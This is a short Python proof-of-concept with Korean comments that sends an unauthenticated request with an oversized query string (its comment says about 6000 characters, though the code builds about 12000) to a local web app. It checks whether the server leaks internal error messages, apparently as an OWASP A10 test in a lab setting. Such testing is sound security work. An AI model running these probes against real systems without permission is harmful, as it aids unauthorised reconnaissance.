import requests

# 1. 타겟 설정
target_url = "http://127.0.0.1:8080/posts"

print(f"[*] A10 취약점 테스트 시작: {target_url}")

# 2. 서버 임계값(4094)을 넘기기 위해 'wasd'를 반복하여 약 6000자 생성
long_query = "wasd" * 3000 
params = {
    "q": long_query,
    "category": "all"
}

try:
    # 3. 로그인 없이 바로 GET 요청 발송
    print(f"[*] 긴 쿼리 스트링 전송 중... (길이: {len(long_query)})")
    response = requests.get(target_url, params=params)

    # 4. 결과 확인
    print(f"\n[!] 서버 응답 상태 코드: {response.status_code}")
    
    # 취약점 판단 조건 설정
    # 1) 상태 코드가 414(URI Too Long)인 경우
    # 2) 응답 본문에 서버의 내부 임계값 메시지가 포함된 경우
    is_vuln_code = (response.status_code == 414)
    is_vuln_text = ("Request Line is too large" in response.text or "Request-URI Too Large" in response.text)

    if is_vuln_code or is_vuln_text:
        print("[!!!] 취약점 재현 성공: 서버의 상세 에러 메시지가 노출됨!")
        print("-" * 50)
        print(f"[노출된 내용]: {response.text.strip()}")
        print("-" * 50)
        print("[설명] 서버가 예외 상황을 안전하게 처리하지 못해 내부 임계값을 드러내고 있습니다.")
    else:
        print("[-] 취약점 재현 실패: 상세 에러가 노출되지 않거나 다른 방식으로 처리되었습니다.")

except Exception as e:
    print(f"[!] 요청 중 오류 발생: {e}")